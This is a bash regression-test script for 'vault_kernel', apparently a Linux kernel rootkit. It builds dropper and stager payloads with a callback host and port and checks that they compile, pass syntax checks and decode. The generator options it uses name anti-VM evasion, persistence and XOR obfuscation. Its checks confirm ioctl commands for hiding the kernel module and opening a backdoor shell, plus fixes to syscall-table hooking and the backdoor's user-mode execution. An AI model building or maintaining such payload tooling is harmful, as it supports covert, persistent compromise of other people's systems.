#!/bin/bash
# vault_kernel — Payload generation regression tests (v3.3)
#
# Validates that every generated payload is well-formed WITHOUT loading
# any kernel module — safe to run anywhere (CI, WSL2, containers):
#
#   1. bash dropper      -> bash -n syntax check + tarball round-trip
#   2. bash dropper XOR  -> key with quotes/backslashes must survive
#   3. C stager          -> full gcc compile
#   4. python stager     -> py_compile
#   5. ioctl constants   -> C stager must match the Go/Python clients
#   6. v3.2 regressions  -> no $T variable collision, no bare strstr
#
# Usage: bash tests/test_payloads.sh
# Exit 0 = all good.

set -euo pipefail

RED=$'\e[0;31m'
GREEN=$'\e[0;32m'
YELLOW=$'\e[1;33m'
NC=$'\e[0m'

PASS=0
FAIL=0

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(dirname "$SCRIPT_DIR")"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

ok()   { echo "  ${GREEN}PASS${NC} $1"; PASS=$((PASS + 1)); }
bad()  { echo "  ${RED}FAIL${NC} $1"; FAIL=$((FAIL + 1)); }
banner() { echo ""; echo "${YELLOW}[TEST] $1${NC}"; }

# ================================================================
banner "Generate payloads (bash plain, bash XOR, C, python)"

python3 "$ROOT/payloads/payload.py" \
    --host 127.0.0.1 --port 4444 --format all \
    --no-anti-vm --no-persistence --no-obfuscate --output "$TMP/plain" >/dev/null

# Nasty key: quote, backslash and double-quote — v3.2 would emit
# broken python for keys like this one.
python3 "$ROOT/payloads/payload.py" \
    --host 127.0.0.1 --port 4444 --format bash \
    --no-anti-vm --no-persistence --xorkey 'a"b\c'"'"'d' \
    --output "$TMP/xor" >/dev/null

for f in "$TMP/plain.sh" "$TMP/plain.c" "$TMP/plain.py" "$TMP/xor.sh"; do
    [ -s "$f" ] || { echo "[-] missing generated payload: $f"; exit 1; }
done
ok "4 payloads generated"

# ================================================================
banner "Bash dropper: syntax + v3.2 \$T collision fixed"

DROPPER="$TMP/plain.sh"
bash -n "$DROPPER"
ok "bash -n clean"

if grep -q 'PAYLOAD_B64=' "$DROPPER" && grep -q 'WORKDIR=' "$DROPPER" \
    && ! grep -qE '^\s*T="H4sIA' "$DROPPER"; then
    ok "payload lives in PAYLOAD_B64, workdir in WORKDIR (T-collision gone)"
else
    bad "variable split not found"
fi

# ================================================================
banner "Bash dropper: tarball round-trip matches src/"

mkdir -p "$TMP/extract"
grep -oE 'PAYLOAD_B64="[^"]*"' "$DROPPER" | head -1 \
    | sed 's/^PAYLOAD_B64="//; s/"$//' \
    | base64 -d | tar -xzf - -C "$TMP/extract"

list_src_names() {
    find "$1" -maxdepth 1 \( -name '*.c' -o -name '*.h' -o -name Makefile \) -printf '%f\n' | sort
}
SRC_FILES=$(list_src_names "$ROOT/src")
EXT_FILES=$(list_src_names "$TMP/extract")
if [ "$SRC_FILES" = "$EXT_FILES" ]; then
    ok "extracted tarball has exactly the $(wc -l <<<"$SRC_FILES") src files"
else
    bad "tarball contents differ from src/"
    diff <(echo "$SRC_FILES") <(echo "$EXT_FILES") || true
fi

# ================================================================
banner "Bash dropper XOR: hostile key survives the round-trip"

XDROPPER="$TMP/xor.sh"
bash -n "$XDROPPER"
ok "bash -n clean with quoted/backslash key"

XKEY='a"b\c'"'"'d'
grep -oE 'PAYLOAD_B64="[^"]*"' "$XDROPPER" | head -1 \
    | sed 's/^PAYLOAD_B64="//; s/"$//' \
    | base64 -d \
    | XKEY="$XKEY" python3 -c "
import sys, os
d = sys.stdin.buffer.read()
k = os.environ['XKEY'].encode()
sys.stdout.buffer.write(bytes(d[i] ^ k[i % len(k)] for i in range(len(d))))
" | tar -tzf - >/dev/null
ok "XOR payload decodes to a valid gzip tarball"

# ================================================================
banner "C stager: compiles with gcc"

CSTAGER="$TMP/plain.c"
gcc -O2 -Wall -o "$TMP/stager_bin" "$CSTAGER" 2>"$TMP/gcc_warn"
if [ -x "$TMP/stager_bin" ]; then
    ok "gcc build OK ($(wc -c <"$TMP/stager_bin") bytes)"
else
    bad "gcc build failed"
fi
if [ -s "$TMP/gcc_warn" ]; then
    bad "gcc emitted warnings:"
    sed 's/^/       /' "$TMP/gcc_warn"
fi

# ================================================================
banner "C stager: ioctl constants match the Go client"

GO_IOCTL="$ROOT/client/go/internal/vaultkernel/ioctl.go"
for pair in "IO_HIDE_MODULE:IOCTL_MODULE_HIDE" "IO_SHELL:IOCTL_BACKDOOR_SHELL"; do
    cname="${pair%%:*}"; goname="${pair##*:}"
    cval=$(grep -oE "#define $cname .*" "$CSTAGER" | head -1)
    gval=$(grep -oE "$goname += +_I[OW]*\(magic, 0x[0-9A-Fa-f]+" "$GO_IOCTL" | head -1)
    if [ -n "$cval" ] && [ -n "$gval" ]; then
        ok "$cname defined and $goname present"
    else
        bad "ioctl constant mismatch ($cname / $goname)"
    fi
done

# ================================================================
banner "Python stager: py_compile"

PYSTAGER="$TMP/plain.py"
if python3 -m py_compile "$PYSTAGER"; then
    ok "py_compile OK"
else
    bad "py_compile failed"
fi

# ================================================================
banner "v3.2 regressions fixed in generator"

if grep -q 'bytes.fromhex' "$ROOT/payloads/payload.py"; then
    ok "XOR key embedded as hex (quote-safe)"
else
    bad "XOR key not hex-embedded"
fi
if grep -q 'UMH_WAIT_EXEC' "$ROOT/src/backdoor.c"; then
    ok "kernel usermodehelper uses UMH_WAIT_EXEC"
else
    bad "UMH_NO_WAIT still present"
fi
if grep -q 'vk_sys_call_table' "$ROOT/src/main.c"; then
    ok "syscall table renamed to vk_sys_call_table (Debian build fix)"
else
    bad "sys_call_table name collision still present"
fi

# ================================================================
echo ""
echo "=========================================="
echo " Results: ${GREEN}${PASS} passed${NC} / ${RED}${FAIL} failed${NC}"
echo "=========================================="
[ "$FAIL" -eq 0 ]
